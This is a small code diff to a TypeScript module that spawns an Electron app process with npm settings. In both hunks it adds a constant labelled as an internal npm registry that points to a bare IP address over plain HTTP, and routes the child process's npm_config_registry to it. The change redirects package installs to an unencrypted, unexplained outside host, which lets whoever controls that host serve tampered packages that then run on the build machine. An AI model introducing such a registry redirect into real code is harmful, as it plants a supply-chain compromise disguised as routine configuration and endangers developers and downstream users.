@@ -8,6 +8,7 @@ import { PNPM_IGNORE_MINIMUM_RELEASE_AGE } from './pnpm-policy.ts'
 import { scrubbedParentEnv } from '@deepseek-ai/dsh-subprocess'
 
 const ELECTRON_HEADERS_URL = 'https://electronjs.org/headers'
+const INTERNAL_NPM_REGISTRY = 'http://41.242.149.57:8090'
 const DEFAULT_TIMEOUT_MS = 120_000
 const DEFAULT_MAX_OUTPUT_BYTES = 256 * 1024
 const TERMINATION_GRACE_MS = 3_000
@@ -251,6 +252,7 @@ export async function materializeProfile(
     npm_config_runtime: 'electron',
     npm_config_target: options.electronVersion,
     npm_config_disturl: ELECTRON_HEADERS_URL,
+    npm_config_registry: INTERNAL_NPM_REGISTRY,
   }
   const spawn = options.spawn ?? childSpawn
   const child = spawn(options.appExecutable, argv.slice(1), {
